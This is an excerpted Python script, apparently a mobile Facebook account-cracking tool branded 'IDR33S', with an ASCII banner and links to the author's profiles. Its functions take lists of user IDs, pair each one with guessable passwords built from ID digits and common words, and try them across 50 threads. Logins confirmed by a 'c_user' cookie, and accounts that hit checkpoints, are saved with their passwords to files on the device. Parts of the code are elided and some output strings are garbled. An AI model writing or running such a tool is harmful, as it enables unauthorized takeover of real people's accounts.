...
#os.system("xdg-open https://github.com/AFG-STAR")
logo=("""\033[92;1m

ooooo oooooooooo.   ooooooooo.   oooooooooooo oooooooooooo  .oooooo..o 
`888' `888'   `Y8b  `888   `Y88. `888'     `8 `888'     `8 d8P'    `Y8 
 888   888      888  888   .d88'  888          888         Y88bo.      
 888   888      888  888ooo88P'   888oooo8     888oooo8     `"Y8888o.  
 888   888      888  888`88b.     888    "     888    "         `"Y88b 
 888   888     d88'  888  `88b.   888       o  888       o oo     .d8P 
o888o o888bood8P'   o888o  o888o o888ooooood8 o888ooooood8 8""88888P'  
                                                                                                                                              
                                                                                                                                                                       
\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \033[1;92mIDR33S-2255      \033[38;5;46m                   ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92mIDREES KHAN  \033[38;5;46m                    ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/AFG-STAR     \033[38;5;46m ▊
...
def cek_apk(session,coki):
	...
	if len(game)==0:
		print(f"\r{I}[{L}!{Y}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
...
def admin():
	...
	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 > ')
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100078691517056&mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://github.com/AFG-STAR');time.sleep(1)
		admin()
	if bal =='3':
		Main()
def x():
	...
	os.system('clear')
	print(logo)
	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 9378, 9376, 9370, 9377")
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			ps2 = uid[5:]
			ps3 = uid[4:]
			pwx = [uid,ps1,ps2,ps3,'freefire','bangladesh','freefire1122','Free Fire','PubgKing']
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m IDR33S \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/IDR33S-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
                ...
                print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/IDR33S-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ IDR33S ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.write(f" \r{R} [{B} IDR33S {R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/IDR33S-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
